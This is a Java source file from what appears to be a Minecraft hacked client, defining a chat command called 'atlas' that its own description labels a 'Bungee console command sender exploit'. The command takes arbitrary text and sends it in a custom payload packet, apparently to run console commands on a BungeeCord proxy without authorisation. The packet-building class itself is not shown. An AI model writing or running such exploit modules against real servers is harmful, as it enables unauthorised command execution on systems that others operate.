package io.github.spigotrce.paradiseclientprivate.command;

import com.mojang.brigadier.arguments.ArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import io.github.spigotrce.paradiseclientfabric.Helper;
import net.minecraft.CommandSource;
import net.minecraft.Packet;
import net.minecraft.CustomPayloadC2SPacket;
import net.minecraft.MinecraftClient;
import net.minecraft.CustomPayload;

public class BungeeConsole extends Command {
    public BungeeConsole(MinecraftClient minecraftClient) {
        super("atlas", "Bungee console command sender exploit", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<CommandSource> build() {
        return (BungeeConsole.literal(this.getName()).executes(context -> {
            Helper.printChatMessage("Incomplete command!");
            return 1;
        })).then(BungeeConsole.argument("command", StringArgumentType.greedyString()).executes(this::build));
    }

    private int build(CommandContext<?> context) {
        Helper.sendPacket(new CustomPayloadC2SPacket(new BungeeCommandWriter(context.getArgument("command", String.class))));
        Helper.printChatMessage("Payload sent!");
        return 1;
    }
}
